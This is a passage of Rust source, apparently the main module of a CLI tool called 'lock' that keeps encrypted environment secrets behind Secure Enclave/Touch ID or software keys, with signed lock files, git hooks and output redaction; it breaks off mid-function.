mod check;
mod crypt;
mod dotenv;
mod hooks;
mod identity;
mod lockfile;
mod redact;
mod se;
mod store;

use std::collections::BTreeSet;
use std::fmt;
use std::io::{self, IsTerminal, Read};
use std::os::unix::process::{CommandExt, ExitStatusExt};
use std::path::{Path, PathBuf};
use std::process::{Command, ExitCode, Stdio};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicI32, Ordering};
use std::time::Duration;

use clap::{Parser, Subcommand};
use zeroize::Zeroizing;

use identity::{Identity, PublicId, Signer};
use lockfile::{LockFile, Unlocked};
use store::Store;

#[derive(Debug)]
pub enum Error {
    Msg(String),
    Decrypt,
    Io(io::Error),
}

impl Error {
    pub fn msg(s: impl Into<String>) -> Error {
        Error::Msg(s.into())
    }
}

impl fmt::Display for Error {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        match self {
            Error::Msg(m) => f.write_str(m),
            Error::Decrypt => f.write_str("no se pudo descifrar (clave incorrecta o archivo alterado)"),
            Error::Io(e) => write!(f, "{e}"),
        }
    }
}

impl From<io::Error> for Error {
    fn from(e: io::Error) -> Error {
        Error::Io(e)
    }
}

/// Variables de entorno cifradas: en el Mac con Touch ID, en servidores con una clave.
#[derive(Parser)]
#[command(name = "lock", version)]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Crea tu identidad (Secure Enclave en el Mac, clave de software en otro lado)
    Init {
        /// Nombre de la identidad (por defecto, el hostname)
        #[arg(long)]
        name: Option<String>,
        /// Usar clave de software (solo en equipos sin Secure Enclave)
        #[arg(long)]
        software: bool,
        /// No guardar: imprime una clave de software nueva para un servidor, CI o respaldo offline
        #[arg(long)]
        print: bool,
    },
    /// Muestra tu identidad publica (lockid1:...) para que te den acceso o confianza
    Key,
    /// Lista entornos, o los nombres de un entorno (sin descifrar)
    #[command(alias = "ls")]
    List { env: Option<String> },
    /// Crea un entorno vacio
    Create { env: String },
    /// Borra un entorno de la boveda local
    Destroy {
        env: String,
        #[arg(long)]
        yes: bool,
    },
    /// Guarda un secreto. El valor se lee de stdin o de un prompt oculto, nunca de los argumentos
    Set {
        /// ENV/NOMBRE, o NOMBRE dentro de un repo vinculado
        target: String,
        /// Genera un valor aleatorio de N bytes (nadie lo ve)
        #[arg(long, value_name = "N")]
        generate: Option<usize>,
    },
    /// Imprime el valor de un secreto (pide Touch ID)
    Get { target: String },
    /// Borra un secreto
    #[command(alias = "remove")]
    Rm { target: String },
    /// Importa un archivo .env a un entorno (lo crea si no existe; si existe, agrega y reemplaza)
    Import { env: String, file: PathBuf },
    /// Ejecuta un comando con el entorno cargado
    Run {
        /// Entorno (por defecto, el del repo)
        env: Option<String>,
        /// No redactar la salida aunque no vaya a una terminal
        #[arg(long)]
        no_redact: bool,
        #[arg(last = true, required = true)]
        command: Vec<String>,
    },
    /// Imprime `export ...` para `eval "$(lock load)"` en tu shell
    Load { env: Option<String> },
    /// Vincula el repo actual a un entorno: escribe .env.lock e instala hooks
    Link { env: String },
    /// Copia el entorno de la boveda a .env.lock (lo usa el hook pre-commit)
    Dump {
        /// Ademas hacer `git add .env.lock`
        #[arg(long)]
        stage: bool,
        /// Sobrescribir aunque el repo tenga una version distinta
        #[arg(long)]
        force: bool,
    },
    /// Trae .env.lock del repo a la boveda local (si esta firmado y es mas nuevo)
    Pull {
        /// Aceptar aunque haya conflicto de versiones (guarda copia .bak)
        #[arg(long)]
        force: bool,
    },
    /// Verifica que las variables que usa el codigo esten en el lock
    Check {
        /// Modo hook: revisa los commits que git va a subir (lee stdin)
        #[arg(long)]
        pre_push: bool,
    },
    /// Hooks de git: pre-commit actualiza .env.lock, pre-push corre `lock check`
    Hooks {
        #[command(subcommand)]
        cmd: Option<HooksCmd>,
    },
    /// Administra quien puede abrir un entorno
    Recipient {
        #[command(subcommand)]
        cmd: RecipientCmd,
    },
    /// Destinatarios que se agregan a todo entorno nuevo (por ejemplo, tu respaldo)
    Defaults {
        #[command(subcommand)]
        cmd: NamedCmd,
    },
    /// Identidades cuya firma acepta este equipo (por ejemplo, tu otro Mac)
    Trust {
        #[command(subcommand)]
        cmd: NamedCmd,
    },
}

#[derive(Subcommand)]
enum RecipientCmd {
    /// Lista los destinatarios
    #[command(alias = "ls")]
    List { env: Option<String> },
    /// Agrega un destinatario (por ejemplo, un servidor)
    Add { env: String, name: String, identity: String },
    /// Quita un destinatario y rota la clave del entorno
    #[command(alias = "remove")]
    Rm { env: String, name: String },
}

#[derive(Subcommand)]
enum HooksCmd {
    /// Instala los hooks en el repo actual (ambos por defecto)
    Install {
        /// Solo el pre-commit (`lock dump --stage`)
        #[arg(long)]
        pre_commit: bool,
        /// Solo el pre-push (`lock check --pre-push`)
        #[arg(long)]
        pre_push: bool,
    },
    /// Quita los bloques de lock de los hooks (deja el resto intacto)
    Uninstall,
    /// Muestra que hooks estan instalados
    Status,
}

#[derive(Subcommand)]
enum NamedCmd {
    /// Muestra la lista
    #[command(alias = "ls")]
    List,
    /// Agrega una identidad (lockid1:..., la imprime `lock key` o `lock init --print`)
    Add { name: String, identity: String },
    /// Quita una identidad de la lista
    #[command(alias = "remove")]
    Rm { name: String },
}

fn main() -> ExitCode {
    disable_core_dumps();
    let cli = Cli::parse();
    match run(cli.cmd) {
        Ok(code) => code,
        Err(e) => {
            eprintln!("lock: {e}");
            ExitCode::FAILURE
        }
    }
}

fn disable_core_dumps() {
    let zero = libc::rlimit { rlim_cur: 0, rlim_max: 0 };
    unsafe { libc::setrlimit(libc::RLIMIT_CORE, &zero) };
}

/// Un entorno encontrado y verificado, y donde escribirlo si cambia.
struct Resolved {
    file: LockFile,
    in_vault: bool,
    /// `.env.lock` del repo actual, si esta vinculado a este entorno.
    repo: Option<PathBuf>,
}

struct Ctx {
    store: Store,
    cwd: PathBuf,
}

impl Ctx {
    fn identities(&self) -> Result<Vec<Identity>, Error> {
        let ids = identity::load_all(&self.store.keys_dir())?;
        if ids.is_empty() {
            return Err(Error::msg(format!(
                "no hay claves en {} ni en ${}. Corre `lock init`.",
                self.store.keys_dir().display(),
                identity::ENV_VAR
            )));
        }
        Ok(ids)
    }

    /// Firmantes de confianza: tus identidades, los fijados en `LOCK_KEY` y `~/.lock/trusted`.
    fn trusted(&self) -> Result<Vec<Signer>, Error> {
        let mut out = vec![];
        for id in identity::load_all(&self.store.keys_dir())? {
            for (i, t) in id.embedded_trust.iter().enumerate() {
                out.push(Signer { name: format!("{}-confianza{}", id.name, i + 1), public: t.clone() });
            }
            out.push(Signer { name: id.name.clone(), public: id.public.signing.clone() });
        }
        for (name, s) in self.store.named_list("trusted")? {
            if let Ok(p) = PublicId::decode(&s) {
                out.push(Signer { name, public: p.signing });
            }
        }
        Ok(out)
    }

    fn verify(&self, file: &LockFile) -> Result<(), Error> {
        file.verify(&self.trusted()?).map(|_| ())
    }

    fn repo_file(&self) -> Option<PathBuf> {
        store::find_repo_file(&self.cwd)
    }

    /// Entorno al que `lock link` vinculo este repo (guardado en .git/config, no en el archivo).
    fn binding(&self) -> Option<String> {
        let out = Command::new("git").arg("-C").arg(&self.cwd).args(["config", "--get", "lock.env"]).output().ok()?;
        let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
        (out.status.success() && lockfile::valid_env_name(&s)).then_some(s)
    }

    /// Busca el entorno: en la boveda primero; si no, en el `.env.lock` del repo.
    /// Todo lo que devuelve esta firmado por alguien de confianza.
    fn resolve(&self, env: Option<&str>) -> Result<Resolved, Error> {
        let env = match env {
            Some(e) => e.to_string(),
            None => {
                let path = self
                    .repo_file()
                    .ok_or_else(|| Error::msg("no hay .env.lock aqui; indica el entorno (ENV o ENV/NOMBRE)"))?;
                store::read_lockfile(&path)?.env
            }
        };
        let repo = self.repo_file().filter(|p| {
            store::read_lockfile(p).is_ok_and(|f| f.env == env) && self.binding().is_none_or(|b| b == env)
        });
        if let Some(file) = self.store.load(&env)? {
            self.verify(&file)?;
            if let Some(p) = &repo
                && let Ok(r) = store::read_lockfile(p)
                && r.version != file.version
            {
                eprintln!("lock: usando {env} v{} de la boveda (.env.lock de este repo: v{})", file.version, r.version);
            }
            return Ok(Resolved { file, in_vault: true, repo });
        }
        match repo {
            Some(p) => {
                let file = store::read_lockfile(&p)?;
                self.verify(&file)?;
                self.store.check_seen(&file)?;
                // Si no se puede registrar (home de solo lectura), se sigue sin proteccion de rollback.
                if let Err(e) = self.store.record_seen(&file) {
                    eprintln!("lock: aviso: no se pudo registrar la version vista ({e})");
                }
                Ok(Resolved { file, in_vault: false, repo: Some(p) })
            }
            None => Err(Error::msg(format!("no existe el entorno {env}. `lock list` muestra los disponibles."))),
        }
    }

    fn persist(&self, r: &Resolved, file: &LockFile) -> Result<(), Error> {
        if r.in_vault {
            self.store.save(file)?;
        } else {
            self.store.record_seen(file)?;
        }
        if let Some(p) = &r.repo {
            store::write_atomic(p, file.serialize().as_bytes(), 0o644)?;
        }
        Ok(())
    }

    /// Lectura-modificacion-escritura bajo bloqueo: descifra, aplica `f`, firma y guarda.
    /// Descifrar y firmar comparten un solo Touch ID.
    fn modify(&self, env: &str, reason: &str, f: impl FnOnce(&mut Unlocked) -> Result<(), Error>) -> Result<(), Error> {
        let _guard = self.store.lock_env(env)?;
        let r = self.resolve(Some(env))?;
        let ids = self.identities()?;
        let mut u = r.file.unlock(&ids, &self.trusted()?, reason)?;
        f(&mut u)?;
        let signer = &ids[0];
        if signer.kind == identity::Kind::Software && identity::enclave_available() {
            eprintln!("lock: aviso: firmando con una clave de software ({})", signer.name);
        }
        let file = u.seal(signer, reason)?;
        self.persist(&r, &file)
    }

    fn open(&self, r: &Resolved, reason: &str) -> Result<Unlocked, Error> {
        r.file.unlock(&self.identities()?, &self.trusted()?, reason)
    }

    /// Separa `ENV/NOMBRE`; sin `/` usa el entorno del repo.
    fn target(&self, target: &str) -> Result<(Resolved, String), Error> {
        let (env, name) = match target.split_once('/') {
            Some((e, n)) => (Some(e), n),
            None => (None, target),
        };
        Ok((self.resolve(env)?, name.to_string()))
    }
}

/// Texto del dialogo de Touch ID. Una sola linea, solo ASCII imprimible (sin
/// saltos, controles ni trucos Unicode), y si es largo se recorta por el
/// medio: el final del comando nunca queda oculto.
fn reason(action: &str, detail: &str) -> String {
    let clean: String = detail
        .chars()
        .map(|c| if c.is_ascii_graphic() || c == ' ' { c } else { '?' })
        .collect::<String>()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");
    const MAX: usize = 150;
    let shown = if clean.len() > MAX {
        format!("{} [...{} caracteres...] {}", &clean[..70], clean.len() - 140, &clean[clean.len() - 70..])
    } else {
        clean
    };
    if shown.is_empty() { action.to_string() } else { format!("{action}: {shown}") }
}

fn hostname() -> String {
    let mut buf = [0u8; 256];
    let ok = unsafe { libc::gethostname(buf.as_mut_ptr().cast(), buf.len()) } == 0;
    let raw = if ok {
        let end = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
        String::from_utf8_lossy(&buf[..end]).into_owned()
    } else {
        "local".into()
    };
    let name: String = raw
        .split('.')
        .next()
        .unwrap_or("local")
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() || c == '-' { c.to_ascii_lowercase() } else { '-' })
        .collect();
    if lockfile::valid_id_name(&name) { name } else { "local".into() }
}

fn read_value(label: &str) -> Result<Zeroizing<String>, Error> {
    if io::stdin().is_terminal() {
        return Ok(Zeroizing::new(rpassword::prompt_password(format!("Valor de {label} (oculto): "))?));
    }
    let mut v = Zeroizing::new(String::new());
    io::stdin().take(1024 * 1024).read_to_string(&mut v)?;
    if v.ends_with('\n') {
        v.pop();
        if v.ends_with('\r') {
            v.pop();
        }
    }
    Ok(v)
}

fn run(cmd: Cmd) -> Result<ExitCode, Error> {
    let ctx = Ctx { store: Store::open()?, cwd: std::env::current_dir()? };
    match cmd {
        Cmd::Init { name, software, print } => cmd_init(&ctx, name, software, print),
        Cmd::Key => {
            let ids = ctx.identities()?;
            for id in &ids {
                println!("{}\t{}\t{}", id.name, id.kind.as_str(), id.public.encode());
            }
            if identity::enclave_available() && ids.iter().any(|i| i.kind == identity::Kind::Software) {
                eprintln!("\nlock: AVISO: hay claves de software en este Mac. Cualquier proceso tuyo puede usarlas sin Touch ID.");
                eprintln!("      Guardalas offline y borralas de {}.", ctx.store.keys_dir().display());
            }
            eprintln!("\nPara dar acceso:  lock recipient add <ENV> <nombre> <lockid1:...>");
            eprintln!("Para confiar:     lock trust add <nombre> <lockid1:...>");
            Ok(ExitCode::SUCCESS)
        }
        Cmd::List { env: None } => cmd_list(&ctx),
        Cmd::List { env: Some(env) } => {
            let r = ctx.resolve(Some(&env))?;
            for n in r.file.names() {
                println!("{n}");
            }
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Create { env } => {
            create(&ctx, &env)?;
            eprintln!("Entorno {env} creado. Agrega secretos con `lock set {env}/NOMBRE`.");
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Destroy { env, yes } => {
            if !yes {
                return Err(Error::msg(format!("esto borra {env} de la boveda local. Repite con --yes para confirmar.")));
            }
            if !ctx.store.delete(&env)? {
                return Err(Error::msg(format!("no existe el entorno {env} en la boveda")));
            }
            eprintln!("Entorno {env} borrado de la boveda. Los .env.lock comiteados en repos siguen existiendo.");
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Set { target, generate } => {
            let (r, name) = ctx.target(&target)?;
            let env = r.file.env.clone();
            if !lockfile::valid_key_name(&name) {
                return Err(Error::msg("nombre invalido (usa letras, numeros y _; no puede empezar con numero)"));
            }
            let value = match generate {
                Some(n) if n == 0 || n > 1024 => return Err(Error::msg("--generate acepta entre 1 y 1024 bytes")),
                Some(n) => {
                    use base64::Engine;
                    Zeroizing::new(base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(crypt::random_bytes(n)))
                }
                None => read_value(&format!("{env}/{name}"))?,
            };
            ctx.modify(&env, &reason(&format!("guardar {env}/{name}"), ""), |u| u.set(&name, &value))?;
            eprintln!("{env}/{name} guardado.");
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Get { target } => {
            let (r, name) = ctx.target(&target)?;
            if !r.file.contains(&name) {
                return Err(Error::msg(format!("{}/{name} no existe", r.file.env)));
            }
            let u = ctx.open(&r, &reason(&format!("MOSTRAR en texto plano {}/{name}", r.file.env), ""))?;
            println!("{}", u.get(&name)?.as_deref().map(String::as_str).unwrap_or(""));
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Rm { target } => {
            let (r, name) = ctx.target(&target)?;
            let env = r.file.env.clone();
            if !r.file.contains(&name) {
                return Err(Error::msg(format!("{env}/{name} no existe")));
            }
            ctx.modify(&env, &reason(&format!("borrar {env}/{name}"), ""), |u| {
                u.remove(&name);
                Ok(())
            })?;
            eprintln!("{env}/{name} borrado.");
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Import { env, file } => {
            let text = Zeroizing::new(store::read_limited(&file, 1024 * 1024)?);
            let pairs = dotenv::parse(&text).map_err(|e| Error::msg(format!("{}: {e}", file.display())))?;
            let pairs: Vec<(String, Zeroizing<String>)> = pairs.into_iter().map(|(k, v)| (k, Zeroizing::new(v))).collect();
            // Si el entorno existe en algun lado (boveda o repo), se agrega sobre el; solo se crea si no.
            if ctx.resolve(Some(&env)).is_err() {
                create(&ctx, &env)?;
            }
            ctx.modify(&env, &reason(&format!("importar {} variables a {env}", pairs.len()), ""), |u| {
                for (k, v) in &pairs {
                    u.set(k, v)?;
                }
                Ok(())
            })?;
            eprintln!("{} variables importadas a {env}. Borra {} (no lo comitees).", pairs.len(), file.display());
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Run { env, no_redact, command } => cmd_run(&ctx, env.as_deref(), no_redact, &command),
        Cmd::Load { env } => {
            let r = ctx.resolve(env.as_deref())?;
            let u = ctx.open(&r, &reason(&format!("EXPORTAR {} completo en texto plano", r.file.env), ""))?;
            for (k, v) in u.all()? {
                // Los nombres vienen validados por el parser; igual no se imprime nada raro.
                if lockfile::valid_key_name(&k) {
                    println!("export {k}={}", dotenv::shell_quote(&v));
                }
            }
            Ok(ExitCode::SUCCESS)
        }
        Cmd::Link { env } => cmd_link(&ctx, &env),
        Cmd::Dump { stage, force } => cmd_dump(&ctx, stage, force),
        Cmd::Pull { force } => cmd_pull(&ctx, force),
        Cmd::Check { pre_push } => cmd_check(&ctx, pre_push),
        Cmd::Hooks { cmd } => cmd_hooks(&ctx, cmd.unwrap_or(HooksCmd::Status)),
        Cmd::Recipient { cmd } => cmd_recipient(&ctx, cmd),
        Cmd::Defaults { cmd } => cmd_named(&ctx, "recipients", cmd),
        Cmd::Trust { cmd } => cmd_named(&ctx, "trusted", cmd),
    }
}

fn cmd_init(ctx: &Ctx, name: Option<String>, software: bool, print: bool) -> Result<ExitCode, Error> {
    let name = name.unwrap_or_else(hostname);
    if !lockfile::valid_id_name(&name) {
        return Err(Error::msg("nombre invalido (usa letras, numeros, . _ -)"));
    }
    if print {
        // La clave nueva lleva fijados como de confianza a los firmantes de este
        // equipo: el servidor solo aceptara archivos firmados por ellos.
        let trust: Vec<Vec<u8>> = ctx.trusted()?.into_iter().map(|s| s.public).collect();
        let id = Identity::new_software(&name);
        println!("{}", *id.private_string(&trust).unwrap());
        eprintln!("Identidad de {name}: {}", id.public.encode());
        eprintln!("1. Guarda la linea de stdout como secreto {} en el servidor/CI (o en un gestor offline si es un respaldo).", identity::ENV_VAR);
        eprintln!("2. Dale acceso aqui:  lock recipient add <ENV> {name} {}", id.public.encode());
        eprintln!("   (respaldo para todo entorno nuevo:  lock defaults add {name} {})", id.public.encode());
        if trust.is_empty() {
            eprintln!("AVISO: este equipo no tiene identidades; la clave no confia en ningun firmante.");
        }
        return Ok(ExitCode::SUCCESS);
    }
    let se = identity::enclave_available();
    if software && se {
        return Err(Error::msg(
            "este Mac tiene Secure Enclave: una clave de software guardada aqui permitiria descifrar sin Touch ID. \
             Usa `lock init` (Secure Enclave), o `lock init --print` para generar una clave de servidor o de respaldo offline.",
        ));
    }
    let mut id = if se { Identity::new_enclave(&name)? } else { Identity::new_software(&name) };
    let path = id.save(&ctx.store.keys_dir())?;
    eprintln!("Identidad {name} ({}) creada en {}", id.kind.as_str(), path.display());
    if id.kind == identity::Kind::Enclave {
        eprintln!("Las claves viven en el Secure Enclave: no se pueden copiar y cada uso pide Touch ID.");
        eprintln!("Si este Mac se pierde, se pierden. Crea un respaldo offline y registralo para todo entorno nuevo:");
        eprintln!("  lock init --print --name respaldo    # guarda la clave en tu gestor de contrasenas");
        eprintln!("  lock defaults add respaldo <lockid1:...>");
    }
    println!("{}", id.public.encode());
    Ok(ExitCode::SUCCESS)
}

fn create(ctx: &Ctx, env: &str) -> Result<(), Error> {
    if !lockfile::valid_env_name(env) {
        return Err(Error::msg("nombre de entorno invalido (usa letras, numeros, . _ -)"));
    }
    let _guard = ctx.store.lock_env(env)?;
    if ctx.store.exists(env) {
        return Err(Error::msg(format!("ya existe el entorno {env}")));
    }
    let ids = ctx.identities()?;
    // Destinatarios iniciales: tus claves guardadas (no LOCK_KEY) y los defaults (p. ej. respaldo).
    let mut recipients: Vec<(String, PublicId)> = ids
        .iter()
        .filter(|i| i.source != identity::ENV_VAR)
        .map(|i| (i.name.clone(), i.public.clone()))
        .collect();
    for (name, s) in ctx.store.named_list("recipients")? {
        let id = PublicId::decode(&s).map_err(|e| Error::msg(format!("~/.lock/recipients ({name}): {e}")))?;
        if !recipients.iter().any(|(n, p)| *n == name || p.encryption == id.encryption) {
            recipients.push((name, id));
        }
    }
    if recipients.is_empty() {
        return Err(Error::msg("no hay claves guardadas en este equipo. Corre `lock init`."));
    }
    let file = LockFile::create(env, &recipients)?.seal(&ids[0], &reason(&format!("crear {env}"), ""))?;
    ctx.store.save(&file)
}

fn cmd_list(ctx: &Ctx) -> Result<ExitCode, Error> {
    let trusted = ctx.trusted()?;
    let repo = ctx.repo_file().and_then(|p| store::read_lockfile(&p).ok());
    let envs = ctx.store.list()?;
    if envs.is_empty() && repo.is_none() {
        eprintln!("No hay entornos. Crea uno con `lock create <Nombre>`.");
    }
    let describe = |f: &LockFile| {
        let who: Vec<&str> = f.recipients.iter().map(|r| r.name.as_str()).collect();
        let warn = match f.verify(&trusted) {
            Ok(_) => String::new(),
            Err(_) => "  ! firma no confiable".into(),
        };
        format!("{}\tv{}\t{} secretos\t[{}]{warn}", f.env, f.version, f.len(), who.join(", "))
    };
    for env in &envs {
        match ctx.store.load(env) {
            Ok(Some(f)) => {
                let mark = if repo.as_ref().is_some_and(|r| r.env == *env) { "  * este repo" } else { "" };
                println!("{}{mark}", describe(&f));
            }
            Ok(None) => {}
            Err(e) => println!("{env}\t! {e}"),
        }
    }
    if let Some(f) = repo
        && !envs.contains(&f.env)
    {
        println!("{}  (solo en .env.lock de este repo)", describe(&f));
    }
    Ok(ExitCode::SUCCESS)
}

/// Pid (o grupo) del hijo de `lock run`, para reenviarle senales.
static CHILD: AtomicI32 = AtomicI32::new(0);
static OWN_GROUP: AtomicBool = AtomicBool::new(false);
static PENDING: AtomicI32 = AtomicI32::new(0);

extern "C" fn forward_signal(sig: libc::c_int) {
    let pid = CHILD.load(Ordering::SeqCst);
    if pid <= 0 {
        PENDING.store(sig, Ordering::SeqCst);
        return;
    }
    deliver(pid, sig);
}

fn deliver(pid: i32, sig: libc::c_int) {
    if OWN_GROUP.load(Ordering::SeqCst) {
        unsafe { libc::killpg(pid, sig) };
    } else if sig != libc::SIGINT && sig != libc::SIGQUIT {
        // Mismo grupo que la terminal: Ctrl-C ya le llega al hijo directamente.
        unsafe { libc::kill(pid, sig) };
    }
}

fn cmd_run(ctx: &Ctx, env: Option<&str>, no_redact: bool, argv: &[String]) -> Result<ExitCode, Error> {
    let r = ctx.resolve(env)?;
    let action = if no_redact {
        format!("SIN REDACCION, ejecutar con {}", r.file.env)
    } else {
        format!("ejecutar con {}", r.file.env)
    };
    let values = ctx.open(&r, &reason(&action, &argv.join(" ")))?.all()?;

    let mut cmd = Command::new(&argv[0]);
    cmd.args(&argv[1..]);
    // El hijo recibe los secretos del entorno, nunca la clave privada.
    cmd.env_remove(identity::ENV_VAR);
    for (k, v) in &values {
        cmd.env(k, v.as_str());
    }

    // Si la salida va a una terminal, la ve una persona: se reemplaza el proceso
    // tal cual. Si no (un agente, un pipe, un log), se redactan los valores.
    // La redaccion es higiene contra ecos accidentales, no una barrera.
    let redactor = Arc::new(redact::Redactor::new(&values));
    drop(values);
    let to_terminal = io::stdout().is_terminal() && io::stderr().is_terminal();
    if no_redact || to_terminal || redactor.is_empty() {
        let err = cmd.exec();
        return Err(Error::msg(format!("{}: {err}", argv[0])));
    }

    // Sin terminal en stdin, el hijo va en su propio grupo para poder terminar
    // el arbol completo; con terminal, comparte grupo para poder leerla.
    let own_group = !io::stdin().is_terminal();
    if own_group {
        cmd.process_group(0);
    }
    OWN_GROUP.store(own_group, Ordering::SeqCst);
    for sig in [libc::SIGINT, libc::SIGTERM, libc::SIGHUP, libc::SIGQUIT] {
        unsafe { libc::signal(sig, forward_signal as *const () as libc::sighandler_t) };
    }
    let mut child = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| Error::msg(format!("{}: {e}", argv[0])))?;
    CHILD.store(child.id() as i32, Ordering::SeqCst);
    let pending = PENDING.swap(0, Ordering::SeqCst);
    if pending != 0 {
        deliver(child.id() as i32, pending);
    }

    let (tx, rx) = std::sync::mpsc::channel();
    let streams: [(Box<dyn Read + Send>, bool); 2] =
        [(Box::new(child.stdout.take().unwrap()), true), (Box::new(child.stderr.take().unwrap()), false)];
    for (stream, is_out) in streams {
        let (tx, redactor) = (tx.clone(), Arc::clone(&redactor));
        std::thread::spawn(move || {
            let res = if is_out {
                redactor.copy(stream, io::stdout().lock())
            } else {
                redactor.copy(stream, io::stderr().lock())
            };
            let _ = tx.send(res);
        });
    }
    drop(tx);

    let status = child.wait()?;
    // Un descendiente puede dejar los pipes abiertos: se espera un poco y se sigue.
    let mut copy_failed = false;
    let deadline = std::time::Instant::now() + Duration::from_secs(2);
    for _ in 0..2 {
        let left = deadline.saturating_duration_since(std::time::Instant::now());
        match rx.recv_timeout(left) {
            Ok(Ok(())) => {}
            Ok(Err(e)) if e.kind() == io::ErrorKind::BrokenPipe => {}
            Ok(Err(e)) => {
                eprintln!("lock: error copiando la salida: {e}");
                copy_failed = true;
            }
            Err(_) => {
                eprintln!("lock: un proceso hijo sigue con la salida abierta; se deja de leer");
                break;
            }
        }
    }
    CHILD.store(0, Ordering::SeqCst);

    let code = status.code().unwrap_or_else(|| 128 + status.signal().unwrap_or(1));
    let code = if code == 0 && copy_failed { 1 } else { code };
    Ok(ExitCode::from(code.clamp(0, 255) as u8))
}

fn git(dir: &Path, args: &[&str]) -> Result<(), Error> {
    let ok = Command::new("git").arg("-C").arg(dir).args(args).status()?.success();
    if !ok {
        return Err(Error::msg(format!("git {} fallo", args.join(" "))));
    }
    Ok(())
}

fn cmd_link(ctx: &Ctx, env: &str) -> Result<ExitCode, Error> {
    let root = store::repo_root(&ctx.cwd).ok_or_else(|| Error::msg("no estas dentro de un repo git"))?;
    let file = ctx.store.load(env)?.ok_or_else(|| Error::msg(format!("no existe el entorno {env} en la boveda")))?;
    ctx.verify(&file)?;
    let path = root.join(store::REPO_FILE);
    if let Ok(current) = store::read_lockfile(&path)
        && current.env != env
    {
        return Err(Error::msg(format!(
            "{} ya es de {}; borralo primero si quieres cambiarlo",
            path.display(),
            current.env
        )));
    }
    store::write_atomic(&path, file.serialize().as_bytes(), 0o644)?;
    git(&root, &["config", "lock.env", env])?;

    // Sin merge de texto: un conflicto se resuelve eligiendo una version entera.
    let attrs = root.join(".gitattributes");
    let current = store::read_limited(&attrs, 1024 * 1024).unwrap_or_default();
    if !current.lines().any(|l| l.trim() == ".env.lock -merge") {
        let sep = if current.is_empty() || current.ends_with('\n') { "" } else { "\n" };
        store::write_atomic(&attrs, format!("{current}{sep}.env.lock -merge\n").as_bytes(), 0o644)?;
    }
    for p in hooks::install(&root, &["pre-commit", "pre-push"])? {
        eprintln!("hook instalado: {}", p.display());
    }
    eprintln!("Repo vinculado a {env}: {}", path.display());
    eprintln!("Comitea .env.lock y .gitattributes. .env (texto plano) debe estar en .gitignore.");
    Ok(ExitCode::SUCCESS)
}

fn cmd_hooks(ctx: &Ctx, cmd: HooksCmd) -> Result<ExitCode, Error> {
    let root = store::repo_root(&ctx.cwd).ok_or_else(|| Error::msg("no estas dentro de un repo git"))?;
    match cmd {
        HooksCmd::Install { pre_commit, pre_push } => {
            let which: Vec<&str> = match (pre_commit, pre_push) {
                (true, false) => vec!["pre-commit"],
                (false, true) => vec!["pre-push"],
                _ => vec!["pre-commit", "pre-push"],
            };
            for p in hooks::install(&root, &which)? {
                eprintln!("hook instalado: {}", p.display());
            }
            if ctx.binding().is_none() {
                eprintln!("Nota: este repo no esta vinculado; el pre-commit no hara nada hasta `lock link <ENV>`.");
            }
        }
        HooksCmd::Uninstall => {
            let touched = hooks::uninstall(&root)?;
            if touched.is_empty() {
                eprintln!("No habia hooks de lock instalados.");
            }
            for p in touched {
                eprintln!("hook quitado: {}", p.display());
            }
        }
        HooksCmd::Status => {
            for (hook, path, installed) in hooks::status(&root)? {
                let cmd = hooks::HOOKS.iter().find(|(h, _)| *h == hook).map_or("", |(_, c)| c);
                let state = if installed { "instalado" } else { "no instalado" };
                println!("{hook}\t{state}\t{cmd}\t{}", path.display());
            }
            if ctx.binding().is_none() {
                eprintln!("Este repo no esta vinculado a ningun entorno (`lock link <ENV>`).");
            }
        }
    }
    Ok(ExitCode::SUCCESS)
}

fn cmd_dump(ctx: &Ctx, stage: bool, force: bool) -> Result<ExitCode, Error> {
    let Some(path) = ctx.repo_file() else { return Ok(ExitCode::SUCCESS) };
    // Solo repos vinculados en este equipo; el entorno sale de .git/config, no del archivo.
    let Some(env) = ctx.binding() else { return Ok(ExitCode::SUCCESS) };
    let Some(vault) = ctx.store.load(&env)? else { return Ok(ExitCode::SUCCESS) };
    ctx.verify(&vault)?;

    let repo = store::read_lockfile(&path).ok();
    let trusted_repo = repo.filter(|f| f.env == env && ctx.verify(f).is_ok());
    if let Some(repo) = &trusted_repo
        && !force
    {
        if repo.version > vault.version {
            return Err(Error::msg(format!(
                ".env.lock ({env} v{}) es mas nuevo que la boveda (v{}) y esta firmado por alguien de confianza. \
                 Traelo con `lock pull`, o pisalo con `lock dump --force`.",
                repo.version, vault.version
            )));
        }
        if repo.version == vault.version && repo.digest() != vault.digest() {
            return Err(Error::msg(format!(
                "conflicto: .env.lock y la boveda tienen {env} v{} con contenido distinto. \
                 Elige: `lock pull --force` (gana el repo) o `lock dump --force` (gana la boveda).",
                vault.version
            )));
        }
    }
    if trusted_repo.as_ref() != Some(&vault) {
        store::write_atomic(&path, vault.serialize().as_bytes(), 0o644)?;
        eprintln!("lock: .env.lock actualizado a {env} v{}", vault.version);
    }
    if stage {
        git(path.parent().unwrap_or(Path::new(".")), &["add", "--", store::REPO_FILE])?;
    }
    Ok(ExitCode::SUCCESS)
}

fn cmd_pull(ctx: &Ctx, force: bool) -> Result<ExitCode, Error> {
    let path = ctx.repo_file().ok_or_else(|| Error::msg("no hay .env.lock en este repo"))?;
    let repo = store::read_lockfile(&path)?;
    if let Some(b) = ctx.binding()
        && b != repo.env
    {
        return Err(Error::msg(format!(".env.lock dice {} pero este repo esta vinculado a {b}", repo.env)));
    }
    // Antes de tocar la boveda: firma de confianza.
    let signer = repo.verify(&ctx.trusted()?)?.to_string();
    let _guard = ctx.store.lock_env(&repo.env)?;
    if let Some(v) = ctx.store.load(&repo.env)?
        && !force
    {
        if v.version > repo.version || (v.version == repo.version && v.digest() == repo.digest()) {
